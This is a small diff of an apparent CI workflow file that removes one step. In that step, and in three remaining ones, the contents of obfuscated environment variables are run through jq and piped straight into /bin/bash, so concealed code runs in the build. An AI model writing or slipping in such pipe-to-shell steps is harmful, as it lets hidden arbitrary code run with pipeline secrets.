@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$ixzse1117" | jq -r .aby3904 | /bin/bash
           echo $yrb35870 | jq -r .f0938 | /bin/bash
           echo $pxyh0 | jq -r .soi647 | /bin/bash
-          printf '%s' "$lbmv6032" | jq -r .kqno855 | /bin/bash
 
       - name: Persist output
         if: always()
